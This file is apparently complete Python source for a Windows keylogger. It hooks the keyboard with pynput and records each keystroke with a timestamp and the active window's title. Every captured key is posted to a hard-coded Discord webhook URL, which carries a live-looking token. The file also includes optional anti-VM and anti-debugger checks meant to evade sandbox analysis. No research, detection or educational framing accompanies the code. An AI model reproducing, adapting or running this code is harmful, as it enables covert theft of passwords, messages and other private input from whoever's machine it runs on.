import os
import sys
import time
import threading
import requests
import ctypes
from datetime import datetime
from pynput import keyboard

# === CONFIG ===
WEBHOOK = "https://discord.com/api/webhooks/1396126875348242624/gEu1Y7MB-6PkFtWyVr0Qu-GJ1XQ1mDHr4vsjiWS84Kg90s75_j859t3Fpr_oYrdvycs8"
MAX_RETRIES = 3
ENABLE_ANTIVM = False
ENABLE_ANTIDEBUG = False

# === STATE ===
shift_pressed = False
capslock_on = False
lock = threading.Lock()

# === UTILITY ===
def timestamp():
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def get_active_window_title():
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value if buff.value else "Unknown"

def send(content):
    for attempt in range(MAX_RETRIES):
        try:
            requests.post(WEBHOOK, json={"content": f"```{content}```"}, timeout=5)
            return
        except:
            time.sleep(1)
    sys.exit(0)

# === KEYLOG ===
def handle_key_press(key):
    global shift_pressed, capslock_on

    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = True
        return
    elif key == keyboard.Key.caps_lock:
        capslock_on = not capslock_on
        return

    try:
        char = key.char
        if char:
            if (shift_pressed or capslock_on) and char.isalpha():
                char = char.upper()
            send_keystroke(char)
    except AttributeError:
        if key == keyboard.Key.space:
            send_keystroke(' ')
        elif key == keyboard.Key.enter:
            send_keystroke('\n')
        elif key == keyboard.Key.tab:
            send_keystroke('\t')
        elif key == keyboard.Key.backspace:
            send_keystroke('[BACKSPACE]')
        else:
            name = key.name if hasattr(key, 'name') else str(key)
            send_keystroke(f"[{name}]")

def send_keystroke(char):
    context = get_active_window_title()
    with lock:
        send(f"{timestamp()} - [{context}]\n{char}")

def handle_key_release(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False

# === ANTI-VM ===
def detect_vm():
    suspicious = ["VBOX", "VMWARE", "VIRTUAL", "QEMU", "HYPERV", "XEN"]
    try:
        output = os.popen("wmic baseboard get manufacturer,product").read().upper()
        for keyword in suspicious:
            if keyword in output:
                return True
    except:
        pass
    return False

# === ANTI-DEBUG ===
def detect_debugger():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

# === MAIN ===
if __name__ == "__main__":
    if ENABLE_ANTIVM and detect_vm():
        sys.exit(0)
    if ENABLE_ANTIDEBUG and detect_debugger():
        sys.exit(0)

    with keyboard.Listener(on_press=handle_key_press, on_release=handle_key_release) as listener:
        listener.join()
